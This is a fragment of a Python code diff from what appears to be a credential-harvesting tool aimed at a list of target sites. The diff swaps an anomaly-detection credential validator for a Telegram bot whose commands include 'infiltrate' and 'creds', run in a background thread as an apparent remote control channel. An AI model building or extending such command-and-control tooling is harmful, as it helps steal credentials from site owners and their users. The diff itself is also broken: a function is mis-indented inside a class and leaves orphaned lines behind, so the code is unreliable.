@@ -277,13 +277,40 @@ TARGET_SITES = {
 }
 
 class CredentialValidator:
-    def __init__(self):
-        self.model = IsolationForest(contamination=0.2, random_state=42)
-        self.is_trained = False
-    
-    def train(self, credentials):
-        if not credentials:
-            return False
+    def init_telegram_bot():
+    try:
+        # Create a simple bot instance first to test connection
+        bot = telegram.Bot(token=BOT_TOKEN)
+        bot_info = bot.get_me()
+        print(f"Bot connected: @{bot_info.username}")
+        
+        # Now initialize the application
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        # Add command handlers
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("infiltrate", infiltrate_command))
+        application.add_handler(CommandHandler("status", status_command))
+        application.add_handler(CommandHandler("creds", creds_command))
+        application.add_handler(CommandHandler("help", help_command))
+        
+        # Add callback handler for inline buttons
+        application.add_handler(telegram.ext.CallbackQueryHandler(button_callback))
+        
+        # Start bot in a background thread
+        def run_bot():
+            try:
+                application.run_polling(drop_pending_updates=True)
+            except Exception as e:
+                print(f"Bot polling error: {e}")
+        
+        bot_thread = threading.Thread(target=run_bot, daemon=True)
+        bot_thread.start()
+        
+        return application
+    except Exception as e:
+        print(f"Failed to initialize Telegram bot: {e}")
+        return None
         
         # Extract features for training
         features = []
